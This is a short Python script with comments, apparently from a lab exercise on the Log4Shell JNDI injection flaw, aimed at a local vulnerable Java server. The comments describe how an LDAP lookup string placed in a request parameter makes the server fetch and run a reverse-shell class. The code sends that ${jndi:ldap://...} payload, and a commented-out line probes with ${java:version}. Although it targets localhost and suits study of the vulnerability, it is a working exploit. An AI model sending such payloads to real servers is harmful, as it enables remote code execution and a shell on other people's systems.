#in this script we go to uor vulnerable java server (HelloWorldServer.java) and inject ldap request to it, and the server will go to ldap and ldap will fetch the   reverse shell file (Exploit.java) and run it, giving us a reverse shell on the server.
# the "ldap://localhost:10389/javaFactory=Exploit,dc=example,dc=com" that we put in the request is obtained from the LDAP server:right click on the javaFactory=Exploit folder (which we created earlier), choose properties, and copy the URL.



import requests
requests.get("http://localhost:9000/?name=${jndi:ldap://localhost:10389/javaFactory=Exploit,dc=example,dc=com}")












#requests.get("http://localhost:9000/?name=${java:version}")
